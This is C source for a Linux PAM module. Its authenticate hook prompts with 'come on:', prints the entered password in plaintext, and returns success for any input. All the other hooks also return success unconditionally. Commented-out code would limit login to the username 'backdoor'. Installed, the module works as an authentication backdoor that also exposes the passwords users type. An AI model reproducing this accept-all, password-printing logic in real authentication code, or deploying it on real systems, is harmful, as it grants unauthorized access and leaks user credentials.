#include <string.h>
#include <syslog.h>
#include <stdio.h>
#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION
#define PAM_SM_PASSWORD
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    printf("setcred\n");
    return PAM_SUCCESS ;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    printf("auth0\n");
    const struct pam_conv *conv;
    struct pam_message resp_message;
    const struct pam_message *msg[1];
    struct pam_response *resp = NULL;
      
    resp_message.msg_style = PAM_PROMPT_ECHO_OFF;  
    resp_message.msg = "come on:";  
    msg[0] = &resp_message; 
    int retval = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
    printf("retVal get_conv : %d\n", retval);
    retval = conv->conv(1, msg, &resp, conv->appdata_ptr);
    printf("retVal conv : %d\n", retval);
    printf("resp->resp : %s\n", resp->resp);
    //const char* pUsername;
    //retval = pam_get_user(pamh, (const char**)&pUsername, "TUsername: ");
    //printf("name0 : %s\n", pUsername);
    //if (retval != PAM_SUCCESS) {
    //    printf("name1 : %s\n", pUsername);
    //    return retval;
    //}
    //if (strcmp(pUsername, "backdoor") != 0) {
    //    printf("name2 : %s\n", pUsername);
    //    return PAM_AUTH_ERR;
    //}
    printf("auth\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("mgmt\n");
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("tok\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("opsession\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,int flags,int argc, const char **argv)
{
    printf("closesession\n");
    return PAM_SUCCESS;
}
